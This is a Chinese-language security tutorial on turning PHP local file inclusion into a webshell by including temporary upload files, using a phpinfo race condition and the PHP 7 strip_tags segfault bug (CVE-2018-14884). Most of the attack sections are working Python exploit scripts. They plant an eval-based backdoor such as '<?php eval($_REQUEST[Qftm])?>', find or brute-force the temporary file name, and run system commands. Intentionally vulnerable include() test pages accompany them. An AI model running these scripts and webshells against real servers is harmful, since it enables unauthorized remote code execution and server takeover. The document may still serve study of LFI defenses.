
# PHP LFI 利用临时文件 Getshell 姿势


                                阅读量   
                                **824060**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/201136/t012b907328af8dab4f.png)](./img/201136/t012b907328af8dab4f.png)



## 前言

最近整理PHP文件包含漏洞姿势的时候，发现一些比较好用的姿势关于本地文件包含漏洞可以利用临时文件包含恶意代码拿到Webshell的一些奇技淫巧，于是打算详细整理一下。



## PHP LFI

PHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。

假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件。

目前，常见的两种临时文件包含漏洞利用方法主要是：`PHPINFO()` and `PHP7 Segment Fault`，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。



## 临时文件

在了解漏洞利用方式的时候，先来了解一下PHP临时文件的机制

### <a class="reference-link" name="%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"></a>全局变量

在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。

$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。

```
$_FILES['userfile']['name'] 客户端文件的原名称。
$_FILES['userfile']['type'] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如"image/gif"。
$_FILES['userfile']['size'] 已上传文件的大小，单位为字节。
$_FILES['userfile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。
$_FILES['userfile']['error'] 该文件上传的错误代码，上传成功其值为0，否则为错误信息。
$_FILES['userfile']['tmp_name'] 文件被上传后在服务端存储的临时文件名
```

在临时文件包含漏洞中`$_FILES['userfile']['name']`这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。

### <a class="reference-link" name="%E5%AD%98%E5%82%A8%E7%9B%AE%E5%BD%95"></a>存储目录

文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的`upload_tmp_dir`属性指定，假如`upload_tmp_dir`的路径不可写，PHP会上传到系统默认的临时目录中。

不同系统服务器常见的临时文件默认存储目录，了解系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。

<a class="reference-link" name="Linux%E7%9B%AE%E5%BD%95"></a>**Linux目录**

Linxu系统服务的临时文件主要存储在根目录的tmp文件夹下，具有一定的开放权限。

```
/tmp/
```

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017a698e2084ab0011.png)

<a class="reference-link" name="Windows%E7%9B%AE%E5%BD%95"></a>**Windows目录**

Windows系统服务的临时文件主要存储在系统盘Windows文件夹下，具有一定的开放权限。

```
C:/Windows/
C:/Windows/Temp/
```

### <a class="reference-link" name="%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"></a>命名规则

存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们必须知道它的命名规则是什么。

可以通过phpinfo来查看临时文件的信息。

<a class="reference-link" name="Linux%20Temporary%20File"></a>**Linux Temporary File**

Linux临时文件主要存储在`/tmp/`目录下，格式通常是（`/tmp/php[6个随机字符]`）

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018d1d61d49d5af756.png)

### <a class="reference-link" name="Windows%20Temporary%20File"></a>Windows Temporary File

Windows临时文件主要存储在`C:/Windows/`目录下，格式通常是（`C:/Windows/php[4个随机字符].tmp`）

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b4d0f072cf1b60e9.png)



## PHPINFO特性

通过上面的介绍，服务器上存储的临时文件名是随机的，这就很难获取其真实的文件名。不过，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。

虽说这个漏洞出现的很早(2011年，国外的安全研究人员将这种攻击手法进行卡了公布)，不过这个技巧确实是个很经典的列子，不会被遗忘的。

### <a class="reference-link" name="%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>测试代码

index.php

```
&lt;?php

    $file  = $_GET['file'];
    include($file);

?&gt;
```

phpinfo.php

```
&lt;?php phpinfo();?&gt;
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件。文件名可以在`$_FILES`变量中找到。这个临时文件，在请求结束后就会被删除。

利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到`$_FILES`变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用
- **利用条件**
```
无   PHPINFO的这种特性源于php自身，与php的版本无关
```

<a class="reference-link" name="%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC"></a>**测试脚本**

编写脚本，上传文件探测是否存在phpinfo包含临时文件的信息。

```
import requests

files = {
  'file': ("aa.txt","ssss")
}
url = "http://x.x.x.x/phpinfo.php"
r = requests.post(url=url, files=files, allow_redirects=False)
print(r.text)
```

运行脚本向服务器发出请求可以看到回显中有如下内容

`Linux`

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018d1d61d49d5af756.png)

`Windows`

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b4d0f072cf1b60e9.png)

<a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"></a>**利用原理**

验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。

但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。

<a class="reference-link" name="%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"></a>**利用过程**

这个时候就需要用到条件竞争，具体原理和过程如下：

（1）发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据

（2）因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大

（3）php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接

（4）所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包

（5）此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除

（6）利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell

（参考ph牛：[https://github.com/vulhub/vulhub/tree/master/php/inclusion](https://github.com/vulhub/vulhub/tree/master/php/inclusion%EF%BC%89) ）

<a class="reference-link" name="Getshell"></a>**Getshell**

利用ph牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如上传的恶意文件内容、phpinfo.php和index.php相应文件的文件名和位置、系统临时文件写入目录等

`exp.py`

```
#!/usr/bin/python
#python version 2.7

import sys
import threading
import socket

def setup(host, port):
    TAG = "Security Test"
    PAYLOAD = """%sr
&lt;?php file_put_contents('/tmp/Qftm', '&lt;?php eval($_REQUEST[Qftm])?&gt;')?&gt;r""" % TAG
    # PAYLOAD = """%sr
    # &lt;?php file_put_contents('/var/www/html/Qftm.php', '&lt;?php eval($_REQUEST[Qftm])?&gt;')?&gt;r""" % TAG
    REQ1_DATA = """-----------------------------7dbff1ded0714r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"r
Content-Type: text/plainr
r
%s
-----------------------------7dbff1ded0714--r""" % PAYLOAD
    padding = "A" * 5000
    REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """r
HTTP_ACCEPT: """ + padding + """r
HTTP_USER_AGENT: """ + padding + """r
HTTP_ACCEPT_LANGUAGE: """ + padding + """r
HTTP_PRAGMA: """ + padding + """r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r
Content-Length: %sr
Host: %sr
r
%s""" % (len(REQ1_DATA), host, REQ1_DATA)
    # modify this to suit the LFI script
    LFIREQ = """GET /index.php?file=%s HTTP/1.1r
User-Agent: Mozilla/4.0r
Proxy-Connection: Keep-Aliver
Host: %sr
r
r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) &lt; offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&amp;gt; ")
        fn = d[i + 17:i + 31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter = 0

class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter &gt;= self.maxattempts:
                    return
                counter += 1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print "nGot it! Shell created in /tmp/Qftm.php"
                    self.event.set()

            except socket.error:
                return

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)
        d += i
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0rnrn"):
            break
    s.close()
    i = d.find("[tmp_name] =&amp;gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print "found %s at %i" % (d[i:i + 10], i)
    # padded up a bit
    return i + 256

def main():
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) &lt; 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port = 80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)

    poolsz = 10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0, poolsz):
        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write("r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter &gt;= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "nTelling threads to shutdown..."
        e.set()

    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__ == "__main__":
    main()
```
- **运行脚本Getshell**
修改脚本之后，运行即可包含生成我们精心设置好的/tmp/Qftm后门文件

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0189c0caa43809494a.png)

拿到RCE之后，可以查看tmp下生成的后门文件

```
http://192.33.6.145/index.php?file=/tmp/Qftm&amp;Qftm=system(%27ls%20/tmp/%27)
```

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0158deff2e174028b8.png)

然后使用后门管理工具连接后门webshell

```
/tmp/Qftm &lt;?php eval($_REQUEST[Qftm])?&gt;
```

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b5c2283a38e7d797.png)



## php7 Segment Fault

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"></a>利用条件
- **利用条件**
```
7.0.0 &lt;= PHP Version &lt; 7.0.28
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

在上面包含姿势中提到的包含临时文件，需要知道phpinfo同时还需条件竞争，但如果没有phpinfo的存在，我们就很难利用上述方法去getshell。

那么如果目标不存在phpinfo，应该如何处理呢？这里可以用`php7 segment fault`特性（[CVE-2018-14884](https://bugs.php.net/bug.php?id=75535)）进行Bypass。

php代码中使用php://filter的过滤器`strip_tags` , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不想phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"></a>漏洞修复

官方在PHP Version 7.0.28时已经修复该漏洞

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c23acd8e061b02a4.png)

官方php7更新日志信息

```
https://www.php.net/ChangeLog-7.php
```

### <a class="reference-link" name="Payload"></a>Payload

更具漏洞分析构造可利用的payload：

```
http://192.33.6.145/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd
```

这种包含会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在`upload_tmp_dir`所指定的目录下，不会被删除，这样就能达成getshell的目的。

### <a class="reference-link" name="%E4%BB%A3%E7%A0%81%E7%8E%AF%E5%A2%83"></a>代码环境

<a class="reference-link" name="%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"></a>**测试代码**

index.php

```
&lt;?php
    $a = @$_GET['file'];
    include $a;
?&gt;
```

dir.php

```
&lt;?php
    $a = @$_GET['dir'];
    var_dump(scandir($a));
?
```

<a class="reference-link" name="%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"></a>**测试环境**

```
PHP Version 7.0.9
```

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a330620896b3cd5c.png)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

<a class="reference-link" name="%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"></a>**攻击载荷**

string.strip_tags过滤器导致出现php segment fault

```
index.php?file=php://filter/string.strip_tags/resource=index.php
```

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013523944235c9f89d.png)

可以看到上面这种包含会导致php执行过程中出现错误，此时上传文件，临时文件会被保存在`upload_tmp_dir`所指定的目录下，从而不会被删除，一直存储在服务的临时目录里面。

<a class="reference-link" name="%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8-%E6%8A%80%E5%B7%A71"></a>**攻击利用-技巧1**

我们可以通过`dir.php`辅助查找生成的临时文件

<a class="reference-link" name="%E7%BC%96%E5%86%99%20Linux%20Exp"></a>**编写 Linux Exp**

Linux网络攻击环境下的脚本编写

```
#python version 2.7

import requests
from io import BytesIO
import re

files = {
  'file': BytesIO('&lt;?php eval($_REQUEST[Qftm]);')
}
url1 = 'http://192.168.68.119/index.php?file=php://filter/string.strip_tags/resource=index.php'
r = requests.post(url=url1, files=files, allow_redirects=False)

url2 = 'http://192.168.68.119/dir.php?dir=/tmp/'
r = requests.get(url2)
data = re.search(r"php[a-zA-Z0-9]{1,}", r.content).group(0)

print "++++++++++++++++++++++"
print data
print "++++++++++++++++++++++"

url3='http://192.168.68.119/index.php?file=/tmp/'+data
data = {
'Qftm':"system('whoami');"
}
r =  requests.post(url=url3,data=data)
print r.content
```

<a class="reference-link" name="%E7%BC%96%E5%86%99%20Windows%20Exp"></a>**编写 Windows Exp**

windows网络攻击环境下的脚本编写

```
#python version 2.7

import requests
from io import BytesIO
import re

files = {
  'file': BytesIO('&lt;?php eval($_REQUEST[Qftm]);')
}
url1 = 'http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php'
r = requests.post(url=url1, files=files, allow_redirects=False)

url2 = 'http://192.168.68.119/web/fi/dir.php?dir=C:/Windows/'
r = requests.get(url2)
data = re.search(r"php[a-zA-Z0-9]{1,}", r.content).group(0)

print "++++++++++++++++++++++"
print data
print "++++++++++++++++++++++"

url3='http://192.168.68.119/web/fi/index.php?file=C:/Windows/'+data+'.tmp'
data = {
'Qftm':"system('whoami');"
}
r =  requests.post(url=url3,data=data)
print r.content
```

<a class="reference-link" name="%E7%B3%BB%E7%BB%9FEXP%E5%88%A9%E7%94%A8"></a>**系统EXP利用**

针对不同的系统环境运行脚本就可以RCE拿到任意代码执行

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013499c43603f5729c.png)

然后查看服务器上恶意临时文件，确实存在未被删除！！

```
http://192.168.68.119/web/fi/dir.php?file=C:/Windows/
```

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012912d8076af5977e.png)

<a class="reference-link" name="Getshell"></a>**Getshell**

由于我们上传的恶意临时文件没有被删除，那么就可以使用Webshell管理工具蚁剑对`php2EFF.tmp`进行包含利用。

```
C:/Windows/php2EF.tmp  &lt;?php eval($_REQUEST[Qftm])?&gt;
```

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017b97508bb73b833f.png)

<a class="reference-link" name="%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8-%E6%8A%80%E5%B7%A72"></a>**攻击利用-技巧2**

<a class="reference-link" name="%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"></a>**暴力破解**

假如没有`dir.php`还能利用吗，答案是可以的，因为我们传入的恶意文件没有被删除，这样我们就可以爆破这个文件的文件名。

在上面的讲述中，我们知道不同的系统默认的临时文件存储路径和方式都不一样
- Linux
Linux临时文件主要存储在`/tmp/`目录下，格式通常是（`/tmp/php[6个随机字符]`）
- windows
Windows临时文件主要存储在`C:/Windows/`目录下，格式通常是（`C:/Windows/php[4个随机字符].tmp`）

对比Linux和Windows来看，Windows需要破解的位数比Linux少，从而Windows会比Linux破解速度快，位数越长所需要耗费的时间就越大。

<a class="reference-link" name="%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"></a>**攻击载荷**

编写临时文件生成和暴力破解攻击载荷

```
#python version 2.7

import requests
from io import BytesIO

files = {
  'file': BytesIO('&lt;?php eval($_REQUEST[Qftm]);')
}
url1 = 'http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php'
r = requests.post(url=url1, files=files, allow_redirects=False)

########################暴力破解模块########################
url2='http://192.168.68.119/web/fi/index.php?file=C:/Windows/php'+{fuzz}+'.tmp&amp;Qftm=system('whoami');'
data = fuzz
print "++++++++++++++++++++++"
print data
print "++++++++++++++++++++++"
########################暴力破解模块########################
```

对于暴力破解模块，可以自己添加多线程模块进行暴力破解，也可以将暴力破解模块拿出来单独进行fuzz，或者比较常用的做法就是将一些fuzz工具的模块拿出来添加到里面稍微改一下接口就可以直接使用。

推荐使用fuzz工具直接进行fuzz测试，fuzz工具一般都包含多线程、自定义字典等，使用起来很方便，不用花费时间去编写调试代码。

个人比较喜欢使用Fuzz大法，不管是目录扫描、后台扫描、Web漏洞模糊测试都是非常灵活的。

推荐几款好用的Fuzz工具

```
基于Go开发：gobuster     https://github.com/OJ/gobuster
基于Java开发：dirbuster  OWASP杰出工具 kali自带
基于Python开发：wfuzz    https://github.com/xmendez/wfuzz
```

fuzz测试，配置参数，我这里使用的是Kali自带的 `dirbuster`进行模糊测试

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015dfb4c192a5ae421.png)

参数设置好之后，开始进行fuzz测试

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b4dac778a83e1e4f.png)

经过一段时间的破解，即可得到上传的临时文件的文件名，同时可以在响应包中看到后门文件的恶意代码也正常解析执行。

<a class="reference-link" name="Getshell"></a>**Getshell**

拿到我们上传的恶意临时文件的文件名之后就可以进行包含利用，同样，我们上传的恶意临时文件没有被删除，使用Webshell管理工具对`php2EFF.tmp`后门文件进行包含利用。

[![](./img/201136/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017b97508bb73b833f.png)



## Refference

```
https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf

https://www.php.net/ChangeLog-7.php
```
